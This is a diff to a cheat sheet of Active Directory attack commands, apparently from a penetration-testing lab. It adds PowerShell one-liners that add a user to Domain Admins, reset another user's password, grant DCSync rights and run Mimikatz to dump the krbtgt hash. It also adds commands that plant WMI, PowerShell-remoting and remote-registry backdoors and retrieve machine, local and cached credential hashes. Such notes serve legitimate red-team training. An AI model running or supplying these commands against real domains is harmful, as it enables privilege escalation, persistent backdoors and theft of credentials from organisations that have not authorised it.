@@ -21,10 +21,12 @@
    * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
    * [ACL](#ACL)
       * [AdminSDHolder](#AdminSDHolder)
-
+      * [DCsync](#DCsync)
+      * [SecurityDescriptor WMI](#SecurityDescriptor-WMI)
+      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
+      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---RemoteRegistry)
 
 # General
-#### Check for admin access on a machine
 ```
 ls \\computername\c$
 ```
@@ -504,6 +506,117 @@ Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAcco
 #### Run SDProp op AD
 ```
 Invoke-SDPropagator -showProgress -timeoutMinutes 1
+
+#Before server 2008
+Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
+```
+
+#### Check domain admin privileges as normal user
+```
+Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘student244’}
+```
+
+#### Add user to domain admin group
+```
+Add-DomainGroupMember -Identity ‘Domain Admins’ -Members student244 -Verbose
+```
+
+#### Abuse resetpassword using powerview_dev
+```
+Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString “Password@123” -AsPlainText -Force ) Verbose
+```
+
+### DCsync
+#### Add full-control rights
+```
+Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName student244 -Rights All -Verbose
+```
+
+#### Add rights for DCsync
+```
+Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName student244 -Rights DCSync -Verbose
+```
+
+#### Execute DCSync
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+### SecurityDescriptor WMI
+```
+. ./Set-RemoteWMI.ps1
+```
+#### On a local machine
+```
+Set-RemoteWMI -Username student244 -Verbose
+```
+
+#### On a remote machine without explicit credentials
+```
+Set-RemoteWMI -Username student244 -Computername dcorp-dc.dollarcorp.moneycorp.local -namespace ‘root\cimv2’ -Verbose
+```
+
+#### On a remote machine with explicit credentials
+Only root/cimv and nested namespaces
+```
+Set-RemoteWMI -Username student244 -Computername dcorp-dc.dollarcorp.moneycorp.local -Credential Administrator -namespace ‘root\cimv2’ -Verbose
+```
+
+#### On remote machine remove permissions
+```
+Set-RemoteWMI -Username student244 -Computername dcorp-dc-namespace ‘root\cimv2’ -Remove -Verbose
+```
+
+#### Check WMI permissions
+```
+Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+### SecurityDescriptor - Powershell Remoting
+```
+. ./Set-RemotePSRemoting.ps1
+```
+
+#### On a local machine
+```
+Set-RemotePSRemoting -Username student244 -Verbose
+```
+
+#### On a remote machine without credentials
+```
+Set-RemotePSRemoting -Username student244 -Computername dcorp-dc -Verbose
+```
+
+#### On a remote machine remove permissions
+```
+Set-RemotePSRemoting -Username student244 -Computername dcorp-dc -Remove
+```
+
+### SecurityDescriptor - Remote Registry
+Using the DAMP toolkit
+```
+. ./Add-RemoteRegBackdoor
+. ./RemoteHashRetrieval
+```
+
+#### Using DAMP with admin privs on remote machine
+```
+Add-RemoteRegBackdoor -Computername dcorp-dc -Trustee student244 -Verbose
+```
+
+#### Retrieve machine account hash from local machine
+```
+Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
+```
+
+#### Retrieve local account hash from local machine
+```
+Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
+```
+
+#### Retrieve domain cached credentials from local machine
+```
+Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 ```
 
 ####
@@ -560,14 +673,3 @@ Invoke-SDPropagator -showProgress -timeoutMinutes 1
 ```
 
 ```
-
-####
-```
-
-```
-
-####
-```
-
-```
-
